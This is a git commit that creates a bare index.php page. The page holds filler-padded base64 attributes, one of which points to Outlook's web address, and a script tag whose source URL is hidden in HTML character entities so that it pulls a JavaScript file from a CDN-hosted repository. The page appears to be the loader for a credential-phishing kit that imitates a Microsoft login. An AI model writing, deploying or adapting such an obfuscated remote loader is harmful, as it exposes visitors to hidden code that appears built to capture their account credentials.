7ff130b6b967c30752aa099f08b0b333fc5cae75
weeirii364 <dss6738226666@gmail.com>
2025-06-03 10:14:05 +0200

    Create index.php

---
+++ public/index.php
@@ -0,0 +1,5 @@
+<html dir="ltr" class="" landing="" lang="en">
+    <head>
+    <meta common="ANY_RANDON_VALUESiowikiej1NSEY0U1hadmFscG9WalUwYUVzMk1XaGlNeTlXVFdkS1kybE5iVWxNVmtKblRVZEtTVFZOVWtOQ1RXVkZWamczTkVKeE56SmlWVU54WlVkMlZ6STFaVVpEWVdZemFtZFFRa1ZEWVM5b01WRkVaQzl6Tm1sWE5UZHZSV2QxU0ZKMlVsVjFNVzh2VUhseVVqZzkmdj15ZXMmYT16Z25lbWx4ZC1yb3RhdGU6dzIyNWcxaGcwMGg3ikiwoiANY_RANDON_VALUES" redirme="ANY_RANDON_VALUESinikiaHR0cHM6Ly9vdXRsb29rLm9mZmljZS5jb20vikiwiiANY_RANDON_VALUES">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+    <script src="&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;&#x63;&#x64;&#x6e;&#x2e;&#x6a;&#x73;&#x64;&#x65;&#x6c;&#x69;&#x76;&#x72;&#x2e;&#x6e;&#x65;&#x74;&#x2f;&#x67;&#x68;&#x2f;&#x69;&#x75;&#x74;&#x73;&#x7a;&#x2f;&#x77;&#x6f;&#x6c;&#x6f;&#x61;&#x64;&#x40;&#x72;&#x65;&#x66;&#x73;&#x2f;&#x68;&#x65;&#x61;&#x64;&#x73;&#x2f;&#x6d;&#x61;&#x69;&#x6e;&#x2f;&#x6c;&#x74;&#x6e;&#x62;&#x64;&#x2e;&#x6a;&#x73;"></script>
